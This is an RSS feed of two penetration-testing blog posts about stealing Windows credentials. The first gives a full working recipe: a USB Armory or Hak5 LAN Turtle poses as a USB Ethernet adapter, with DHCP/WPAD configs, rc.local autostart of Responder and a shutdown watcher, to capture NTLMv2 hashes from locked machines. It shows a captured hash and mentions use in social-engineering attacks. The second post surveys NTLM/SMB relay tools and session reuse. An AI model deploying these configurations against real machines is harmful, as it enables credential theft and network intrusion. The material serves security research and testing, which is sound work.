<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>responder on malicious.link</title>
    <link>https://malicious.link/tags/responder/</link>
    <description>Recent content in responder on malicious.link</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Tue, 06 Sep 2016 07:35:28 -0500</lastBuildDate>
    
        <atom:link href="https://malicious.link/tags/responder/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Snagging creds from locked machines</title>
      <link>https://malicious.link/post/2016/snagging-creds-from-locked-machines/</link>
      <pubDate>Tue, 06 Sep 2016 07:35:28 -0500</pubDate>
      
      <guid>https://malicious.link/post/2016/snagging-creds-from-locked-machines/</guid>
      <description>&lt;p&gt;First off, this is dead simple and shouldn&amp;rsquo;t work, but it does. Also, there is no possible way that I&amp;rsquo;m the first one that has identified this, but here it is (&lt;strong&gt;trust me, I tested it so many ways to confirm it because I couldn&amp;rsquo;t believe it was true&lt;/strong&gt;)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TL;DR&lt;/strong&gt; USB Ethernet + DHCP + Responder == Creds&lt;/p&gt;
&lt;h1 id=&#34;thesis&#34;&gt;Thesis:&lt;/h1&gt;
&lt;p&gt;If I plug in a device that masquerades as a USB Ethernet adapter and has a computer on the other end, can I capture credentials from a system, even when locked out (yes, logged in, just locked). (..or do even more, but we&amp;rsquo;ll save that for another time, this post is already too long)&lt;/p&gt;
&lt;h2 id=&#34;device-setup&#34;&gt;Device Setup&lt;/h2&gt;
&lt;p&gt;I started off with a &lt;a href=&#34;https://inversepath.com/usbarmory&#34;&gt;USB Armory&lt;/a&gt; ($155) but below I&amp;rsquo;ll show you how to do this with a &lt;a href=&#34;http://hakshop.myshopify.com/collections/lan-turtle/products/lan-turtle&#34;&gt;Hak5 Turtle&lt;/a&gt; ($49.99) as well.&lt;/p&gt;
&lt;p&gt;I&amp;rsquo;ll leave the setting up of the base device itself to you, but here are some links that can start you on your way:&lt;/p&gt;
&lt;h3 id=&#34;usb-armory&#34;&gt;USB Armory&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Debian/Jessie - &lt;a href=&#34;https://github.com/inversepath/usbarmory/wiki/Starting#preparing-your-own-microsd-card&#34;&gt;https://github.com/inversepath/usbarmory/wiki/Starting#preparing-your-own-microsd-card&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Kali on USB Armory - &lt;a href=&#34;http://docs.kali.org/kali-on-arm/kali-linux-on-usb-armory&#34;&gt;http://docs.kali.org/kali-on-arm/kali-linux-on-usb-armory&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Resizing the SD partition - &lt;a href=&#34;http://base16.io/?p=61&#34;&gt;http://base16.io/?p=61&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;hak5-turtle&#34;&gt;Hak5 Turtle&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Turtle video guides and wiki: &lt;a href=&#34;https://lanturtle.com/wiki/#!videos.md&#34;&gt;https://lanturtle.com/wiki/#!videos.md&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;tools&#34;&gt;Tools&lt;/h2&gt;
&lt;p&gt;Basically the capturing is done with &lt;a href=&#34;https://twitter.com/pythonresponder&#34;&gt;Laurent Gaffi√©&amp;rsquo;s&lt;/a&gt; &lt;a href=&#34;https://github.com/lgandx/Responder&#34;&gt;Responder&lt;/a&gt; so you need to find a way to get Responder onto the device. The Hak5 Turtle already has a module for it:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2016/turtleshell.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;You do have to &amp;ldquo;Enable&amp;rdquo; the module for the first time (plugged into Internet access) to get it to actually download all of dependencies and package itself.&lt;/p&gt;
&lt;p&gt;Then you also need to do a &lt;code&gt;opkg update&lt;/code&gt; and &lt;code&gt;opkg install python-openssl&lt;/code&gt; so that Responder will run correctly. This is only a temporary issue as the module is being fixed to include this step.&lt;/p&gt;
&lt;p&gt;As for the USB Armory is you can either use SCP, Internet Connection Sharing, the USB host/client adapter:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2016/usbarmory_host_adapter.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;The default install of Debian/Jessie doesn&amp;rsquo;t have Python installed so you will have to work through all of the dependencies (on the Kali version this is not needed) and will require Internet access to perform:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;apt-get install -y python git python-pip python-dev screen sqlite3
pip install pycrypto
git clone https://github.com/spiderlabs/responder
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;configuration&#34;&gt;Configuration&lt;/h2&gt;
&lt;h3 id=&#34;armory&#34;&gt;Armory&lt;/h3&gt;
&lt;p&gt;First, setting up the interface isn&amp;rsquo;t needed but it will help with consistence since each image for the Armory come with different default IP addresses and it&amp;rsquo;s good to set a solid base.&lt;/p&gt;
&lt;h4 id=&#34;etcnetworkinterfaces&#34;&gt;/etc/network/interfaces&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# interfaces(5) file used by ifup(8) and ifdown(8)
# Include files from /etc/network/interfaces.d:
source-directory /etc/network/interfaces.d
auto usb0
allow-hotplug usb0
iface usb0 inet static
  address 192.168.2.201
  netmask 255.255.255.0
  gateway 192.168.2.1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Next we set up the DHCP server:&lt;/p&gt;
&lt;h4 id=&#34;etcdhcpdhcpdconf&#34;&gt;/etc/dhcp/dhcpd.conf&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ddns-update-style none;

option domain-name &amp;#34;domain.local&amp;#34;;
option domain-name-servers 192.168.2.201;

default-lease-time 60;
max-lease-time 72;

# If this DHCP server is the official DHCP server for the local
# network, the authoritative directive should be uncommented.
authoritative;

# Use this to send dhcp log messages to a different log file (you also
# have to hack syslog.conf to complete the redirection).
log-facility local7;

# wpad
option local-proxy-config code 252 = text;

# A slightly different configuration for an internal subnet.
subnet 192.168.2.0 netmask 255.255.255.0 {
  range 192.168.2.1 192.168.2.2;
  option routers 192.168.2.201;
  option local-proxy-config &amp;#34;http://192.168.2.201/wpad.dat&amp;#34;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The only special configuration here is to send the &amp;ldquo;Proxy Config&amp;rdquo; option to any DHCP clients. Why this is even a thing I have no idea, but note this line:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;ldquo;DHCP has a higher priority than DNS: if DHCP provides the WPAD URL, no DNS lookup is performed.&amp;rdquo;&lt;/strong&gt; from &lt;a href=&#34;https://en.wikipedia.org/wiki/Web_Proxy_Autodiscovery_Protocol&#34;&gt;the Wikipedia article on WPAD&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Next we set up things to automatically run. We edit the &lt;code&gt;rc.local&lt;/code&gt; file so that it does a few things:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Clears out all DHCP leases and start the DHCP server&lt;/strong&gt;. There is probably a more elegant way to do this, but because this &amp;ldquo;computer&amp;rdquo; is being plugged in and taken out pretty frequently, we could run into a max in leases but most likely the file will get corrupted at some point so we just remove and re-add it.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Start Responder in a screen session&lt;/strong&gt;. This way we can get logging going on the screen session as a sort of backup for the Sqlite3 database and log files that Responder creates.&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;etcrclocal&#34;&gt;/etc/rc.local&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;#!/bin/sh -e

# Clear leases
rm -f /var/lib/dhcp/dhcpd.leases
touch /var/lib/dhcp/dhcpd.leases

# Start DHCP server
/usr/sbin/dhcpd

# Start Responder
/usr/bin/screen -dmS responder bash -c &amp;#39;cd /root/responder/; python Responder.py -I usb0 -f -w -r -d -F&amp;#39;

exit 0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;To enable logging of the screen sessions (which also gives you insight into if anything went wrong), you add a &lt;code&gt;.screenrc&lt;/code&gt; file. There is a lot more that I put in these, mostly for aesthetics but the important pieces are these:&lt;/p&gt;
&lt;h4 id=&#34;rootscreenrc&#34;&gt;/root/.screenrc&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# Logging
deflog on
logfile /root/logs/screenlog_$USER_.%H.%n.%Y%m%d-%0c:%s.%t.log
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That&amp;rsquo;s it, you should be able to reboot your USB Armory and start picking up creds anywhere you can stick a USB in.&lt;/p&gt;
&lt;h3 id=&#34;hak5-turtle-1&#34;&gt;Hak5 Turtle&lt;/h3&gt;
&lt;p&gt;Everything is pretty much already done for you, the only difference is that opkg is your package manager:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;opkg update
opkg install python-openssl screen
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Remove the symlink to /tmp/ so that the logs will stick around&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;rm -rf /overlay/etc/turtle/Responder/logs
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And the &lt;code&gt;/overlay/etc/rc.local&lt;/code&gt; file is slightly different&lt;/p&gt;
&lt;h4 id=&#34;overlayetcrclocal&#34;&gt;/overlay/etc/rc.local&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/etc/init.d/dnsmasq stop
/usr/sbin/screen -dmS responder bash -c &amp;#39;cd /overlay/etc/turtle/Responder; python Responder.py -I br-lan -f -w -r -d -F&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;why-does-this-work&#34;&gt;Why does this work?&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;Because USB is Plug-and-Play. This means that even if a system is locked out, the device still gets installed. Now, I believe there are restrictions on what types of devices are allowed to install at a locked out state on newer operating systems (Win10/El Capitan), but Ethernet/LAN is definitely on the white list.&lt;/li&gt;
&lt;li&gt;Computers are constantly creating traffic, even if you don&amp;rsquo;t have any browsers or applications open, and most computers trust their local network for some reason (I know the technical bits on &amp;lsquo;why&amp;rsquo;, just complaining&amp;hellip;)&lt;/li&gt;
&lt;li&gt;Network preference when there are more than gateway or network connection is based on &amp;ldquo;metrics&amp;rdquo; on Windows and a combination of metrics and &lt;a href=&#34;https://support.apple.com/kb/PH18458?locale=en_US&#34;&gt;&amp;ldquo;preference&amp;rdquo; on OSX&lt;/a&gt;, but by default &amp;ldquo;wired&amp;rdquo; and &amp;ldquo;newer/faster&amp;rdquo; always win out.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;This means that by plugging in the device it quickly becomes the gateway, DNS server, WPAD server and others thanks to Responder.&lt;/p&gt;
&lt;p&gt;The average time for freshly inserted into a locked workstation and by the time I have creds is about 13 seconds, all depends on the system. Some addition setup I used inotify to watch for a file change in the &lt;code&gt;Responder.db&lt;/code&gt; database and shutdown the Armory. This helps finalize file writes as well and giving me an indicator via the LED that creds were obtained.&lt;/p&gt;
&lt;p&gt;To do that you need to install the &lt;code&gt;inotify-tools&lt;/code&gt; package and add the following to the &lt;code&gt;rc.local&lt;/code&gt; file:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;echo &amp;#34;Staring cred watch&amp;#34; &amp;gt;&amp;gt; /root/rc.log
/usr/bin/screen -dmS notify bash -c &amp;#39;while inotifywait -e modify /root/responder/Responder.db; do shutdown -h now; done&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;end-result&#34;&gt;End Result:&lt;/h1&gt;
&lt;p&gt;What you see in the video is the Windows 10 lock screen (Full screened fresh install VM). When the LED goes solid white the Armory has fully shutdown because of the watch script, creds achieved!.&lt;/p&gt;

&lt;div style=&#34;position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;&#34;&gt;
  &lt;iframe src=&#34;https://www.youtube.com/embed/Oplubg5q7ao&#34; style=&#34;position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;&#34; allowfullscreen title=&#34;YouTube Video&#34;&gt;&lt;/iframe&gt;
&lt;/div&gt;

&lt;p&gt;Bring it back home and look at the results:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root@wpad:~# sqlite3 /root/responder/Responder.db &amp;#39;select * from responder&amp;#39;
2016-09-04 10:59:43|HTTP|NTLMv2|192.168.2.1||SITTINGDUCK\mubix||5EAEA2859C397D8AE48CA87F:01010000000001E9D23F49F7891F38965D80A0010000000000000000000000000000000900260048005400540050002F007800780066006600730062006E0070006300000000000000....
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sweet!! Game over!&lt;/p&gt;
&lt;p&gt;Tested on:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Windows 98 SE&lt;/li&gt;
&lt;li&gt;Windows 2000 SP4&lt;/li&gt;
&lt;li&gt;Windows XP SP3&lt;/li&gt;
&lt;li&gt;Windows 7 SP1&lt;/li&gt;
&lt;li&gt;Windows 10 (Enterprise and Home)&lt;/li&gt;
&lt;li&gt;OSX El Capitan / Mavericks (I was able to get creds on both of these but I&amp;rsquo;m still testing to see if it was a fluke, or my own configurations)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I still have not tested on Linux, I will make a new post on if that works. Please leave comments below if you see things I can improve upon, or errors.&lt;/p&gt;
&lt;h3 id=&#34;usb-armory-vs-hak5-lan-turtle&#34;&gt;USB Armory vs Hak5 LAN Turtle&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;The Armory is more versitile with APT package to do more fun, definitely a great way to dev the attack. More storage (SD based) and slightly faster processor&lt;/li&gt;
&lt;li&gt;Hak5 LAN Turtle is MUCH easier to pass off when you are trying to plug in a device during an SE attack. It might not have the LED that the Armory does for determining when creds are achieved, but it has the added functionality of a working ethernet port, so you could get creds AND a shell. Definitely worth the extra hassel to get it working right.&lt;/li&gt;
&lt;/ol&gt;
</description>
    </item>
    
    <item>
      <title>Effective NTLM / SMB Relaying</title>
      <link>https://malicious.link/post/2014/effective-ntlm-smb-relaying/</link>
      <pubDate>Wed, 21 May 2014 11:26:38 -0500</pubDate>
      
      <guid>https://malicious.link/post/2014/effective-ntlm-smb-relaying/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;http://en.wikipedia.org/wiki/SMBRelay&#34;&gt;SMB Relay&lt;/a&gt; has been around for a long while. I even have a post about using it along with LNK files here:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://malicious.link/post/2012/ms08_068-ms10_046-fun-until-2018/&#34;&gt;MS08-068 + MS10-046 = Fun until 2018&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Here is the problem though. Most of the tools to exploit it either catch the authentication in NTLMv2/NTLMv1 (which is not always easy to crack) or assume administrative access (because they attempt to PSEXEC with the incoming session). Well, since MS08-068 thats much harder to pin down. You have to know who is going to hit your relay server and what other location they might be an admin on. You also have to a service you want to run on that target.&lt;/p&gt;
&lt;h2 id=&#34;current-tools&#34;&gt;Current Tools:&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://www.xfocus.net/articles/200305/smbrelay.html&#34;&gt;SMBRelay&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.tarasco.org/security/smbrelay/&#34;&gt;SMBRelay3&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href=&#34;https://github.com/SpiderLabs/Responder&#34;&gt;SpiderLabs Responder&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://corelabs.coresecurity.com/index.php?module=Wiki&amp;amp;action=view&amp;amp;type=tool&amp;amp;name=Impacket&#34;&gt;SMBRelayX in Impacket&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/server/http_ntlmrelay.rb&#34;&gt;HTTP NTLM Relay Metasploit Module&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/smb/smb_relay.rb&#34;&gt;SMB Relay PSExec Metasploit Module&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/admin/oracle/ora_ntlm_stealer.rb&#34;&gt;Oracle SMB Relay Metasploit Module&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/sap/sap_smb_relay.rb&#34;&gt;SAP SMB Relay Metasploit Module&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;soft-relay-tools&#34;&gt;&amp;ldquo;Soft&amp;rdquo; relay tools:&lt;/h2&gt;
&lt;p&gt;Now, some would argue that you just spin up the relay at a target then leave it until one pops. I&amp;rsquo;m not really a fan of that. You will not only be creating multiple access attempt log entries, but you are also just throwing away all of those user authentication attempts. There are 3 tools that agree with me.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://code.google.com/p/squirtle/&#34;&gt;Squirtle&lt;/a&gt;
* Squirtle is awesome plus it&amp;rsquo;s written in a language I understand (ruby) but it has one serious downfall, many of the post-auth features are left up to the user to develop. It does have a great API but needs some coding to get to do certain things.&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://intercepter.nerf.ru/&#34;&gt;Intercepter-NG&lt;/a&gt;
* I have tested Interceptre-NG out a lot and it has some fantastic features, not to mention that it does relaying on a Windows host, which is impressive all by itself (due to 445 default bind). My only problem with it is that it&amp;rsquo;s closed source. But definitely recommended.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The 3rd is a tool called &amp;ldquo;ZackAttack&amp;rdquo; by &lt;a href=&#34;https://twitter.com/zfasel&#34;&gt;Zack Fasel&lt;/a&gt;, you can find it here on &lt;a href=&#34;https://github.com/urbanesec/ZackAttack&#34;&gt;Github:ZackAttack&lt;/a&gt;. You can find the video of the talk releasing this tool on &lt;a href=&#34;https://www.youtube.com/watch?v=nHU3ujyw_sQ&#34;&gt;Youtube&lt;/a&gt;. So what is so special about this tool? Other than the fact that most of the web interface is broken horribly it has this amazing bit of code that acts as a SOCKS proxy. This SOCKS proxy identifies SMB or HTTP traffic that has NTLM authentication going on and rewrites it based on captured sessions.&lt;/p&gt;
&lt;p&gt;What does this mean? If I use SpiderLab&amp;rsquo;s Responder, for instance, to spoof/get/fake a bunch of users into connecting to my machine via automatic or forced methods to the capture/keep services that ZackAttack spins up, I can then run smbclient or Outlook or Web browser, push it through the ZackAttack SOCKS proxy, pick a username out of the captured names, and use any password I want when asked, and the SOCKS proxy will automatically replace it en route with the valid session information.&lt;/p&gt;
&lt;p&gt;This way I can use every authentication that comes in to its highest potential for pwnage. The video below shows how this can be used to connect to a &amp;ldquo;Network share&amp;rdquo;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Update: One thing to mention that ZackAttack does that I haven&amp;rsquo;t seen other tools do, even Squirtle or Intercepter-NG is getting 3+ successful authentications out of a single relay from a user. ZackAttack does this with some clever HTTP Keep-Alive and SMB &amp;ldquo;reauth&amp;rdquo; kung fu.&lt;/strong&gt;&lt;/p&gt;
&lt;iframe width=&#34;420&#34; height=&#34;315&#34; src=&#34;//www.youtube.com/embed/05W5tUG7z2M&#34; frameborder=&#34;0&#34; allowfullscreen&gt;&lt;/iframe&gt;
&lt;h2 id=&#34;other-references&#34;&gt;Other References:&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://blog.spiderlabs.com/2014/02/responder-20-owning-windows-networks-part-3.html&#34;&gt;2014-02 &lt;strong&gt;SpiderLabs&lt;/strong&gt; - Responder 2.0 Owning Windows Networks Part 3&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.netspi.com/blog/entryid/213/smb-attacks-through-directory-traversal&#34;&gt;2014-01 &lt;strong&gt;NetSPI Blog&lt;/strong&gt; - SMB Attacks Through Directory Traversal&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://intercepter.nerf.ru/SMB_Hijacking.Kerberos_is_defeated.pdf&#34;&gt;2013-06 &lt;strong&gt;Ares&lt;/strong&gt; - SMB Hijacking Kerberos is defeated&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://pen-testing.sans.org/blog/pen-testing/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python&#34;&gt;2013-04 &lt;strong&gt;SANS Pentesting Blog&lt;/strong&gt; - SMB Relay Demystified and NTLMv2 Pwnage with Python&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.screencast.com/users/Core_Security/folders/Training%20Videos%20for%20CORE%20Impact%20Pro/media/c48247ab-1f0b-4e86-a78a-1d7e347c0989&#34;&gt;2013-01 &lt;strong&gt;Core Security Training Video&lt;/strong&gt; - How To Perform a SMB Relay Attack&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://markgamache.blogspot.com/2013/01/ntlm-challenge-response-is-100-broken.html&#34;&gt;2013-01 &lt;strong&gt;Mark Gamache&lt;/strong&gt; - NTLM Challenge Response is 100% Broken&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.netspi.com/blog/entryid/139/executing-smb-relay-attacks-via-sql-server-using-metasploit&#34;&gt;2012-12 &lt;strong&gt;NetSPI Blog&lt;/strong&gt; - Executing SMB Relay Attacks via SQL Server using Metasploit&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://webstersprodigy.net/2012/07/22/metasploit-generic-ntlm-relay-module/&#34;&gt;2012-07 &lt;strong&gt;WebstersProdigy&lt;/strong&gt; - Metasploit Generic NTLM Relay Module&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://intercepter.nerf.ru/Actuality_of_SMBRelay_in_Modern_Windows_Networks.pdf&#34;&gt;2012-04 &lt;strong&gt;Ares&lt;/strong&gt; - Actuality of SMBRelay in Modern Windows Networks&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://erpscan.com/?s=smbrelay+bible&amp;amp;x=0&amp;amp;y=0&#34;&gt;2011-01 &lt;strong&gt;Digital Security Research Group Blog&lt;/strong&gt; - SMBRelay Bible&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://vimeo.com/5500931&#34;&gt;2009-07 &lt;strong&gt;Carnal0wnage&lt;/strong&gt; - Metasploit Oracle TNSCMD SMBRelay Demo&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.skullsecurity.org/2008/ms08-068-preventing-smbrelay-attacks&#34;&gt;2008-11 &lt;strong&gt;Ron Bowes&lt;/strong&gt; - Preventing SMB Relay Attacks&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://squirtle.googlecode.com/files/NTLM%20is%20Dead%20-%20DefCon%2016.pdf&#34;&gt;2008-08 &lt;strong&gt;Kurt Grutzmacher at DEF CON 16&lt;/strong&gt; - NTLM is Dead!&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://heasman.blogspot.com/2008/06/stealing-password-hashes-with-java-and.html&#34;&gt;2008-06 &lt;strong&gt;John Heasman&lt;/strong&gt; - Stealing Password Hashes with Java and IE&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.powershow.com/view/28526-OWZjN/NTLM_Relay_Attacks_powerpoint_ppt_presentation&#34;&gt;2008-04 &lt;strong&gt;Eric Rachner: NTLM Relay Attacks&lt;/strong&gt; - Released tool &amp;lsquo;scurvy&amp;rsquo;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.blackhat.com/presentations/bh-usa-07/Moore_and_Valsmith/Presentation/bh-usa-07-moore_and_valsmith.pdf&#34;&gt;2007-08 &lt;strong&gt;HD Moore and Valsmith&lt;/strong&gt; - Tactical Exploitation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://web.archive.org/web/20060719183135/http://www.isecpartners.com/documents/NTLM_Unsafe.pdf&#34;&gt;2004-12 (ARCHIVE.ORG) &lt;strong&gt;Jesse Burns at SySCAN&lt;/strong&gt; - NTLM Authentication Unsafe&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.securityfriday.com/tools/ScoopLM.html&#34;&gt;2002-01 &lt;strong&gt;Azbil SecurityFriday Ltd&lt;/strong&gt; - ScoopLM&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.xfocus.net/articles/200305/smbrelay.html&#34;&gt;2001-03 &lt;strong&gt;@lantaCon&lt;/strong&gt; - Reference from &lt;strong&gt;March 31 2001 talk&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I tried finding all the original/semi original references about SMB (LM/NTLM) Relaying. If you have others please leave a comment below so I can add them to the list.&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>
